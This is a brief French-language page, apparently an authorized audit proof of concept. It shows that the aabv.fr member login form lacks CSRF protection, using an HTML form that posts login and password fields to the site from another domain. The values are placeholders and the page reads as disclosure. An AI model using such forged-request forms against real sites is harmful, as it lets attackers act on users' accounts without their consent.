Démonstration audit autorisé — Cette page externe envoie un POST vers aabv.fr sans jeton CSRF, prouvant l'absence de protection anti-CSRF sur le formulaire de connexion.

Preuve CSRF — formulaire de connexion

Le site aabv.fr n'inclut aucun jeton CSRF dans le formulaire adhérents (POST /).

Une page hébergée sur n'importe quel autre domaine peut soumettre ce formulaire :

<form method="POST" action="https://www.aabv.fr/">
  <input name="login" value="...">
  <input name="mdp" value="...">
  <input name="remindme" value="1">
</form>

Au clic : une nouvelle fenêtre s'ouvre sur aabv.fr avec la réponse du serveur (message « Login et/ou mot de passe incorrects »).
Preuve : le serveur accepte les requêtes POST sans vérifier l'origine ni un jeton secret.
